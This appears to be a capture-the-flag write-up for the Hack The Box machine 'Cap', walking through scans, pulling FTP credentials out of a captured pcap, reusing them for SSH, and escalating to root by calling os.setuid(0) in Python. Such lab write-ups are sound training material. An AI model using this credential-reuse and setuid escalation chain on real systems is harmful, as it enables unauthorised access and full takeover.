# Cap

# Target :

```python
10.10.10.245:21
```

# Enumeration :

## Rustscan :

```python
PORT   STATE SERVICE REASON         VERSION
21/tcp open  ftp     syn-ack ttl 63 vsftpd 3.0.3

22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fa:80:a9:b2:ca:3b:88:69:a4:28:9e:39:0d:27:d5:75 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC2vrva1a+HtV5SnbxxtZSs+D8/EXPL2wiqOUG2ngq9zaPlF6cuLX3P2QYvGfh5bcAIVjIqNUmmc1eSHVxtbmNEQjyJdjZOP4i2IfX/RZUA18dWTfEWlNaoVDGBsc8zunvFk3nkyaynnXmlH7n3BLb1nRNyxtouW+q7VzhA6YK3ziOD6tXT7MMnDU7CfG1PfMqdU297OVP35BODg1gZawthjxMi5i5R1g3nyODudFoWaHu9GZ3D/dSQbMAxsly98L1Wr6YJ6M6xfqDurgOAl9i6TZ4zx93c/h1MO+mKH7EobPR/ZWrFGLeVFZbB6jYEflCty8W8Dwr7HOdF1gULr+Mj+BcykLlzPoEhD7YqjRBm8SHdicPP1huq+/3tN7Q/IOf68NNJDdeq6QuGKh1CKqloT/+QZzZcJRubxULUg8YLGsYUHd1umySv4cHHEXRl7vcZJst78eBqnYUtN3MweQr4ga1kQP4YZK5qUQCTPPmrKMa9NPh1sjHSdS8IwiH12V0=
|   256 96:d8:f8:e3:e8:f7:71:36:c5:49:d5:9d:b6:a4:c9:0c (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBDqG/RCH23t5Pr9sw6dCqvySMHEjxwCfMzBDypoNIMIa8iKYAe84s/X7vDbA9T/vtGDYzS+fw8I5MAGpX8deeKI=
|   256 3f:d0:ff:91:eb:3b:f6:e1:9f:2e:8d:de:b3:de:b2:18 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPbLTiQl+6W0EOi8vS+sByUiZdBsuz0v/7zITtSuaTFH

80/tcp open  http    syn-ack ttl 63 Gunicorn
|_http-server-header: gunicorn
| http-methods: 
|_  Supported Methods: OPTIONS HEAD GET
|_http-title: Security Dashboard
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
```

## Nmap (UDP) :

```python
PORT      STATE         SERVICE      VERSION
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   closed        msrpc
137/udp   open|filtered netbios-ns
138/udp   closed        netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   closed        snmptrap
445/udp   closed        microsoft-ds
500/udp   open|filtered isakmp
514/udp   closed        syslog
520/udp   closed        route
631/udp   closed        ipp
1434/udp  open|filtered ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp closed        unknown
```

## SSH ( 22 ) :

<aside>
💡

Password-Based Authentication is not safe in SSH 

</aside>

```python
ssh root@cap.htb 
    
The authenticity of host 'cap.htb (10.10.10.245)' can't be established.
ED25519 key fingerprint is SHA256:UDhIJpylePItP3qjtVVU+GnSyAZSr+mZKHzRoKcmLUI.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'cap.htb' (ED25519) to the list of known hosts.
root@cap.htb's password:
```

## HTTP ( 80 ) :

```python
dirsearch -u http://cap.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Target: http://cap.htb/

[00:56:40] Starting: 
[00:56:42] 302 -  208B  - /data  ->  http://cap.htb/
[00:56:45] 200 -   17KB - /ip
[00:56:58] 200 -   35KB - /netstat
[00:57:15] 302 -  222B  - /capture
```

## FTP ( 21 ) :

![image.png](Cap/image.png)

- Downloaded Capture files from the Web-server running on `PORT : 80`
- Inspected the `.pcap`  files and found Interesting thing to look into.
- searched for `FTP`  and got the user and password for `FTP`  Logon.
    
    ```python
    nathan : Buck3tH4TF0RM3!
    ```
    
    ```python
    ftp nathan@cap.htb
    
    Connected to cap.htb.
    220 (vsFTPd 3.0.3)
    331 Please specify the password.
    Password: 
    230 Login successful.
    Remote system type is UNIX.
    Using binary mode to transfer files.
    ftp> ls
    229 Entering Extended Passive Mode (|||59674|)
    150 Here comes the directory listing.
    -r--------    1 1001     1001           33 Oct 06 19:35 user.txt
    226 Directory send OK.
    ```
    
- Tried to login to `SSH`  with the same Credentials and LOL 😅!! got the `SSH`  of the user `nathan` .
    
    ```python
    nathan@cap:~$ id
    uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
    ```
    
- In this `python 3.8`   version was used in the system ( through `Linpeas.sh` )
- Checked the user of the `python 3.8`  version
    
    ```python
    ls -la /usr/bin/python3.8
    -rwxr-xr-x 1 root root 5486384 Jan 27  2021 /usr/bin/python3.8
    ```
    
- Got it ! the owner of it is root
- We can use it for `Post-exploitation`

# Post-Exploitation :

- Exploited `Python 3.8`  to get the `ROOT` user.

```python
python3

Python 3.8.5 (default, Jan 27 2021, 15:41:15) 
[GCC 9.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.

>>> import os

>>> os.system('id')
uid=1001(nathan) gid=1001(nathan) groups=1001(nathan)
0

>>> os.system('whoami')
nathan
0

>>> os.setuid(0)

>>> os.system('whoami')
root
0
>>> os.system('sh')
# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
# cd /root
# ls
root.txt  snap
```